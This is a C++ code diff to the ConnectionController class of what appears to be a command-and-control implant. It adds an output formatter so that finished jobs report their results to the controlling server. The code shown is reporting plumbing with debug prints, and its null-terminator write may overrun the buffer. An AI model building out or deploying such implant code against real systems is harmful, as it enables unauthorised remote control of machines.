@@ -11,6 +11,7 @@ using namespace std;
 #include "C2Config.h"
 #include "ServerResponse.h"
 #include "ObjectLoader.h"
+#include "OutputFormatter.h"
 
 class ConnectionController {
 private:
@@ -168,7 +169,7 @@ public:
     }
 
     // Sends finish request to the server to let know we finished executing the job.
-    int finishJob(int code) {
+    int finishJob(int code, OutputFormatter* of, unsigned char* jobResult = NULL) {
 
         // Creat URL with job ID.
         char* urlJob = prepareJobURL();
@@ -176,6 +177,14 @@ public:
         if (responseBody.size() <= 0) {
             return RESPONSE_ERROR;
         }
+
+        int outputSize;
+        char* outputData = of->getOutputData(&outputSize);
+        printf("FinishJob outputData loc: %p\n", outputData);
+        outputData[outputSize] = '\0';
+
+        printf("MAIN_THREAD: output(%d):\n", outputSize);
+        // printf("%s\n", outputData);
 
         // Cleanup job for the next one.
         this->OBJECT_SIZE = 0;
